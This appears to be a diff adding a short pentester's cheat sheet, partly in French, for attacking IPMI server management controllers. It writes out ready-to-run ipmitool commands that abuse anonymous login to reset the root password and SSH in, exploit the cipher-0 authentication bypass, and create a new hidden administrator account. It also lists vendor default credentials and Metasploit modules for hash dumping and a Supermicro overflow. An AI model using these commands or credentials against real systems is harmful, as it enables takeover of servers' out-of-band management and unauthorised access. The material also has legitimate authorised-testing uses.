@@ -1,0 +1,53 @@
+# ipmi
+
+https://community.rapid7.com/community/metasploit/blog/2013/07/02/a-penetration-testers-guide-to-ipmi
+http://fish2.com/security/
+
+# gul
+* Exploiting IPMI
+https://community.rapid7.com/community/metasploit/blog/2013/07/02/a-penetration-testers-guide-to-ipmi
+
+* Anonymous auth
+$ ipmitool -I lanplus -H <target_IP> -U '' -P '' user list
+$ ipmitool -I lanplus -H <target_IP> -U '' -P '' user set password <ID_root> <new_password>
+$ ssh root@<target_IP>
+root@<target_IP>'s password: <new_password>
+
+* Default username / password
+              Product Name                      | Default Username | Default Password
+------------------------------------------------+------------------+-------------
+HP Integrated Lights Out (iLO)                  | Administrator    | <factory randomized 8-character string>
+Dell Remote Access Card (iDRAC, DRAC)           | root             | calvin
+IBM Integrated Management Module (IMM)          | USERID           | PASSW0RD (with a zero)
+Fujitsu Integrated Remote Management Controller | admin            | admin
+Supermicro IPMI (2.0)                           | ADMIN            | ADMIN
+Oracle/Sun Integrated Lights Out Manager (ILOM) | root             | changeme
+ASUS iKVM BMC                                   | admin            | admin
+
+* Vérifier si la vulnerabilité cipher 0 est présente
+$ ipmitool -I lanplus -H <target_IP> -U Administrator -P Password1 user list
+Error: Unable to establish IPMI v2 / RMCP+ session
+Get User Access command failed (channel 14, user 1)
+
+$ ipmitool -I lanplus -C 0 -H <target_IP> -U Administrator -P Password1 user list
+ID  Name         Callin  Link Auth    IPMI Msg   Channel Priv Limit
+1   Administrator    true    false      true       ADMINISTRATOR
+2   (Empty User)     true    false      false      NO ACCESS
+
+* Ajouter un utilisateur avec les droits admins
+Ici, en utilisant le cipher 0
+
+$ ipmitool -I lanplus -C 0 -H <target_IP> -U Administrator -P Password1 user set name     <ID_Empty_User> gul
+$ ipmitool -I lanplus -C 0 -H <target_IP> -U Administrator -P Password1 user set password <ID_Empty_User> Password1
+$ ipmitool -I lanplus -C 0 -H <target_IP> -U Administrator -P Password1 user priv         <ID_Empty_User> 4
+$ ipmitool -I lanplus -C 0 -H <target_IP> -U Administrator -P Password1 user enable       <ID_Empty_User>
+
+* Metasploit modules
+auxiliary/scanner/ipmi/ipmi_cipher_zero
+Détecte si l'attaque par cipher 0 est possible
+
+auxiliary/scanner/ipmi/ipmi_dumphashes
+Demande gentillement les hashes au service :)
+
+exploit/multi/upnp/libupnp_ssdp_overflow
+Exploite la vulnerabilité "Supermicro IPMI UPnP Vulnerability"
